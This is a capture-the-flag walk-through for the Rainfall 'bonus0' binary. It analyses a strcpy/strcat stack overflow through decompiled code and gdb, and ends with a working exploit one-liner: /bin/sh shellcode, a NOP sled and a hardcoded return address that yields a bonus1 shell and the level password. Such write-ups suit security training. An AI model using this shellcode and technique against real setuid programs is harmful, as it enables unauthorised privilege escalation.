# Walk-through bonus0

## Introduction
bonus0 is part of the Rainfall challenge series, where the goal is to escalate privileges by exploiting a vulnerable binary. This walk-through covers analyzing the binary, identifying vulnerabilities, and obtaining elevated access.

## Security Checks
Examining the binary's security mechanisms reveals that it lacks several modern protections, making it more susceptible to exploitation:

```bash
bonus0@RainFall:~$ checksec --file bonus0 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   bonus0
```
**Key observations:**
> **No RELRO** : The binary does not protect against GOT overwrite attacks.

> **No stack canary** : Buffer overflow attacks are possible.

> **NX disabled** : Stack is executable, allowing shellcode execution.

> **No PIE** : The binary has a fixed memory layout, making exploitation easier.

### Analyzing `bonus0`

After running the command `ls -l bonus0`, we observe the following output:
```
-rwsr-s---+ 1 bonus1 users 5566 Mar  6  2016 bonus0

```

From this output, we can see that the binary `bonus0` is set with **SUID (Set User ID)** and **SGID (Set Group ID)** permissions. This means:

- The `s` in the owner (`rws`) and group (`r-s`) permission bits indicates that the program will run with the privileges of its owner (`bonus1`) and group (`users`), regardless of who executes it.
- In other words, when any user runs this program, it will execute as if it were run by the `bonus1` user.

## **Debugging**  

```
bonus0@RainFall:~$ ./bonus0 
 - 
stdin1
 - 
stdin2
stdin1 stdin2 
```
After running ./bonus0, we observed that the program reads input from stdin twice, likely expecting two separate user inputs
## **Code Analysis**

The relevant functions are:

### **1. `main` function**
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[42]; // [esp+16h] [ebp-2Ah] BYREF

  pp(s);
  puts(s);
  return 0;
}
```
- The program declares a **42-byte** buffer `s` on the stack.
- It passes `s` as an argument to the function `pp(s)`.
- After `pp(s)` executes, `puts(s)` prints the contents of `s`.

### **2. `pp` function**
```c
char *__cdecl pp(char *dest)
{
  char src[20]; // [esp+28h] [ebp-30h] BYREF
  char v3[28]; // [esp+3Ch] [ebp-1Ch] BYREF

  p(src, " - ");
  p(v3, " - ");
  strcpy(dest, src);
  *(_WORD *)&dest[strlen(dest)] = unk_80486A4;
  return strcat(dest, v3);
}
```
- Two **20-byte** and **28-byte** buffers (`src` and `v3`) are declared on the stack.
- The function `p(src, " - ")` is called, which reads user input into `src`.
- The function `p(v3, " - ")` is called, which reads user input into `v3`.
- **Vulnerability:**  
  - `strcpy(dest, src)` does **not** check for buffer overflow.
  - `strcat(dest, v3)` can **overflow `s` in `main`**, leading to **stack corruption**.
 
### **3. `p` function**
```
char *__cdecl p(char *dest, char *s)
{
  char buf[4104]; // [esp+10h] [ebp-1008h] BYREF

  puts(s);
  read(0, buf, 0x1000u);
  *strchr(buf, 10) = 0;
  return strncpy(dest, buf, 0x14u);
}
```
- A **4104-byte buffer (`buf`) is allocated on the stack**.
- The program calls `puts(s);`, which prints the second argument (`s`).
- `read(0, buf, 0x1000u);` reads **4096 bytes from stdin** into `buf`.
- `*strchr(buf, 10) = 0;` replaces the **first newline (`\n`)** with `NULL` to terminate the string.
- `strncpy(dest, buf, 0x14u);` copies **20 bytes (0x14)** from `buf` into `dest`.

#### What We Know

From our analysis, we have identified several key vulnerabilities in the `bonus0` binary:

1. **Buffer Overflow in `pp` Function**
   - The function `pp(dest)` calls `p(src, " - ")` and `p(v3, " - ")` to take user input into `src` (20 bytes) and `v3` (28 bytes).
   - These buffers are copied into `dest` (42 bytes) using `strcpy(dest, src)` and `strcat(dest, v3)`, both of which **do not check for buffer size limits**.
   - This can **overwrite the saved return address** on the stack, leading to code execution control.

2. **Stack Execution Allowed (`NX Disabled`)**
   - Since NX is **disabled**, we can execute shellcode placed in our input buffer.
   - This allows us to inject **a shell-spawning payload** and execute arbitrary commands.

3. **Fixed Memory Layout (`No PIE`)**
   - The binary has a fixed memory layout, making it **easier to predict memory addresses** for return-oriented programming (ROP) or direct shellcode execution.

### **Exploit Strategy**

2. **Inject Executable Shellcode**
   - Since NX is disabled, we place shellcode directly into our input to spawn a shell (`/bin/sh`).

3. **Redirect Execution to Our Payload**
   - We overwrite the return address with the **stack address** where our shellcode is stored.

### **Building the Exploit**

The proof-of-concept exploit consists of:

- **First Input**: Inject shellcode padded with NOPs (`0x90`).
- **Second Input**: Overwrite the return address to point to our shellcode.
### Finding the Return Address
Now that we have all the necessary ingredients for our payload, we need to determine the return address. We can find it using the following approach:
```
gdb-peda$ r < <(python -c 'print("A"*48 + "\n" + "C" * 24 +  "B" * 8)')
```
After execution, we analyze the stack:
```
[------------------------------------stack-------------------------------------]
0000| 0xbfffe670 --> 0xbfffe680 ('A' <repeats 48 times>)
0004| 0xbfffe674 --> 0xa ('\n')
0008| 0xbfffe678 --> 0x1000 
0012| 0xbfffe67c --> 0x0 
0016| 0xbfffe680 ('A' <repeats 48 times>)
0020| 0xbfffe684 ('A' <repeats 44 times>)
0024| 0xbfffe688 ('A' <repeats 40 times>)
0028| 0xbfffe68c ('A' <repeats 36 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x080484fc in p ()
```
Next, let's execute the following to examine the contents of the stack around the current stack pointer:
```bash
gdb-peda$ x/40wx $esp 
```
This will give us a more detailed view of the stack's state:

```bash
0xbfffe670:	0xbfffe680	0x0000000a	0x00001000	0x00000000
0xbfffe680:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe690:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6b0:	0x43434300	0x43434343	0x43434343	0x43434343
0xbfffe6c0:	0x43434343	0x43434343	0x42424243	0x42424242
** 0xbfffe6d0:	0x00000a42	0x00000000	0x00000000	0x00000000
0xbfffe6e0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe6f0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe700:	0x00000000	0x00000000	0x00000000	0x00000000
```

## Proof-of-Concept (Working Exploit) 
``` bash
(python -c 'print("\x90"*42 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")'; python -c 'print("A" * 9 + "\xd0\xe6\xff\xbf" + "\x90" * 8)'; cat) | ./bonus0
 - 
 - 
��������������������AAAAAAAAA����BBBBBBB��� AAAAAAAAA����BBBBBBB���
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
